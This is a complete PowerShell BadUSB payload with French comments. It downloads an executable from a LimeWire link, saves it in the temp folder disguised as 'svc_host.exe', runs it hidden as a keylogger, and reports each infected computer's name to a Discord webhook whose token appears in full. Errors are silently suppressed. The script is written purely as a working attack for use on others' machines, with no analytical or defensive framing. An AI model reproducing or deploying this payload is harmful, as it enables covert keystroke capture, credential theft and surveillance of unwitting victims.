# Payload BadUSB – Télécharge et exécute ton keylogger (version 2025)
$webhook = "https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW"  # Ton webhook Discord

# Ton lien LimeWire direct pour l'exe
$exeUrl = "https://limewire.com/d/FDphV#TmLbLMqVie"  # ← Ton lien exact
$exePath = "$env:TEMP\svc_host.exe"

try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
    Start-Process $exePath -WindowStyle Hidden  # Lance en caché
    # Log de démarrage sur Discord
    $logMessage = @{
        content = "BadUSB déclenché sur $env:COMPUTERNAME - Keylogger installé avec succès"
    } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook -Method Post -Body $logMessage -ContentType 'application/json'
} catch {
    # Erreur silencieuse
}
